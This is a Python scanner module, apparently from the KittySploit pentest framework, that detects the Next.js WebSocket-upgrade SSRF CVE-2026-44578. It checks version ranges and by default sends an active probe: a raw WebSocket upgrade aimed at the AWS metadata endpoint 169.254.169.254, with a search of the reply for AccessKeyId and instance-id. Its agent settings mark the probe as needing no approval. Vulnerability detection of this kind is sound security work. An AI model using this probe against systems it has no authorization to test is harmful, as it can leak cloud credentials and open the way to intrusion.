#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-44578 — Next.js WebSocket upgrade SSRF detection."""

import re
import socket
import ssl
from contextlib import closing
from typing import Optional, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.nextjs_probe import (
    extract_nextjs_version,
    nextjs_version_tuple,
    probe_nextjs_stack,
)

# Affected: 13.4.13–15.5.15 and 16.0.0–16.2.4. Fixed: 15.5.16 / 16.2.5.
_WS_KEY = "dGhlIHNhbXBsZSBub25jZQ=="
_NEXT_MARKERS = ("/_next/static", "/_next/chunks", 'charset="utf-8"')


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Next.js WebSocket upgrade SSRF (CVE-2026-44578) detection",
        "description": (
            "Detects Next.js and flags CVE-2026-44578 (router-server WebSocket upgrade "
            "SSRF). Affected: 13.4.13–15.5.15 and 16.0.0–16.2.4; fixed in 15.5.16 / "
            "16.2.5. Self-hosted Node server only (Vercel not affected). Optional "
            "active probe: absolute-URI WebSocket upgrade to AWS IMDSv1. Companion "
            "auxiliary confirms SSRF / cloud metadata."
        ),
        "author": ["Hadrian Security", "mitsec", "ynsmroztas", "KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-44578",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-44578",
            "https://github.com/advisories/GHSA-c4j6-fc7j-m34r",
            "https://bastion.tech/blog/nextjs-cve-2026-44578-websocket-ssrf-self-hosted/",
        ],
        "modules": [
            "auxiliary/scanner/http/nextjs_cve_2026_44578_websocket_upgrade_ssrf",
        ],
        "tags": [
            "scanner",
            "nextjs",
            "ssrf",
            "websocket",
            "cve-2026-44578",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.25,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["nextjs", "next.js"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/_next/"],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "ssrf_primitive", "from_detail": "websocket_upgrade"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [
                    "auxiliary/scanner/http/nextjs_cve_2026_44578_websocket_upgrade_ssrf",
                ],
            },
        },
    }

    port = OptPort(443, "HTTP(S) port", True)
    ssl = OptBool(True, "Use HTTPS", True, advanced=True)
    active_probe = OptBool(
        True,
        "Confirm with WebSocket upgrade SSRF probe to IMDSv1 (port 80)",
        required=False,
    )
    probe_url = OptString(
        "http://169.254.169.254/latest/meta-data/",
        "Absolute http:// URL for active probe (port 80 only)",
        required=False,
        advanced=True,
    )
    socket_timeout = OptFloat(8.0, "Raw socket timeout for active probe", required=False, advanced=True)

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        return opt

    @staticmethod
    def _is_affected(version: str) -> Optional[bool]:
        if not version:
            return None
        ver = nextjs_version_tuple(version)
        # 13.4.13 – 15.5.15
        if (13, 4, 13) <= ver[:3] <= (15, 5, 15):
            return True
        # 15.5.16+ on 15.x patched
        if ver[0] == 15 and ver[:3] >= (15, 5, 16):
            return False
        # 16.0.0 – 16.2.4
        if (16, 0, 0) <= ver[:3] <= (16, 2, 4):
            return True
        if ver[0] == 16 and ver[:3] >= (16, 2, 5):
            return False
        if ver[:3] < (13, 4, 13):
            return False
        if ver[0] > 16:
            return False
        return None

    def _host(self) -> str:
        target = str(self._o(self.target) or "").strip()
        if "://" in target:
            from urllib.parse import urlparse

            return urlparse(target).hostname or target
        return target.split("/")[0].split(":")[0]

    def _looks_like_next_body(self, text: str) -> bool:
        lower = (text or "").lower()
        return any(m.lower() in lower for m in _NEXT_MARKERS)

    def _ws_ssrf(self, ssrf_url: str) -> Tuple[int, str]:
        host = self._host()
        port = int(self._o(self.port))
        use_ssl = self._to_bool(self._o(self.ssl))
        timeout = float(self._o(self.socket_timeout) or 8.0)
        raw = (
            f"GET {ssrf_url} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: Upgrade\r\n"
            f"Upgrade: websocket\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"Sec-WebSocket-Key: {_WS_KEY}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
        ).encode()
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            with closing(sock):
                sock.sendall(raw)
                sock.settimeout(timeout)
                buf = b""
                try:
                    while len(buf) < 131072:
                        chunk = sock.recv(8192)
                        if not chunk:
                            break
                        buf += chunk
                except socket.timeout:
                    pass
            resp = buf.decode(errors="replace")
            match = re.match(r"HTTP/[\d.]+ (\d+)", resp)
            code = int(match.group(1)) if match else 0
            parts = resp.split("\r\n\r\n", 1)
            body = parts[1] if len(parts) > 1 else resp
            return code, body
        except Exception as exc:
            return 0, str(exc)

    def _probe_hit(self, code: int, body: str) -> Tuple[bool, str]:
        if "Failed to proxy http:/" in body:
            return True, "proxy failure fingerprint (vulnerable path reached)"
        if code == 200 and not self._looks_like_next_body(body):
            patterns = (
                r"ami-[a-f0-9]{8}",
                r"AccessKeyId",
                r"instance-id",
                r'"accountId"',
                r"ami-id",
                r"hostname",
                r"local-ipv4",
            )
            if any(re.search(p, body, re.I) for p in patterns):
                return True, "IMDS-like body"
            if len(body) < 2000 and "169.254.169.254" in str(self._o(self.probe_url) or ""):
                return True, f"non-Next HTTP 200 ({len(body)}b) from metadata probe"
        return False, ""

    def run(self):
        ok, reason = probe_nextjs_stack(self)
        if not ok:
            print_error(reason or "Next.js not detected")
            if hasattr(self, "set_info"):
                self.set_info(reason=reason, confidence="low")
            return False

        print_success("Next.js fingerprint matched")
        response = self.http_request(method="GET", path="/", allow_redirects=True)
        version = extract_nextjs_version(response) if response else ""
        for path in ("/_next/static/", "/"):
            if version:
                break
            r = self.http_request(method="GET", path=path, allow_redirects=True)
            if r:
                version = extract_nextjs_version(r) or version

        affected = self._is_affected(version) if version else None
        if version:
            print_info(f"Version: {version}")
            if affected is True:
                print_warning("Version in CVE-2026-44578 affected range")
            elif affected is False:
                print_success("Version appears patched for CVE-2026-44578")
            else:
                print_info("Version outside known windows / inconclusive")
        else:
            print_info("Version unknown — rely on active probe")

        confirmed = None
        detail = ""
        if self.active_probe:
            url = str(self._o(self.probe_url) or "").strip()
            if not url.startswith("http://"):
                print_error("probe_url must be http:// (port 80 only)")
            else:
                print_status(f"Active WebSocket SSRF probe → {url}")
                code, body = self._ws_ssrf(url)
                confirmed, detail = self._probe_hit(code, body)
                print_info(f"Probe HTTP {code} ({len(body)}b)")
                if confirmed:
                    print_warning(f"SSRF signal: {detail}")
                else:
                    print_info(
                        "No SSRF confirmation (patched, Vercel/nginx edge, "
                        "no IMDS, or IMDSv2-only)"
                    )

        if confirmed or affected is True:
            if hasattr(self, "set_info"):
                self.set_info(
                    severity="high",
                    cve="CVE-2026-44578",
                    version=version or None,
                    reason=detail
                    or (
                        f"Next.js {version} in affected range"
                        if version
                        else "Next.js may be affected (version unknown)"
                    ),
                    confidence="high" if confirmed else "medium",
                )
            print_warning(
                "Follow up: auxiliary/scanner/http/"
                "nextjs_cve_2026_44578_websocket_upgrade_ssrf"
            )
            return True

        if affected is False and not confirmed:
            if hasattr(self, "set_info"):
                self.set_info(
                    severity="info",
                    version=version,
                    reason=f"Next.js {version} appears patched",
                )
            return True

        if hasattr(self, "set_info"):
            self.set_info(
                severity="medium",
                cve="CVE-2026-44578",
                reason="Next.js detected; CVE-2026-44578 not confirmed",
                confidence="low",
            )
        return True
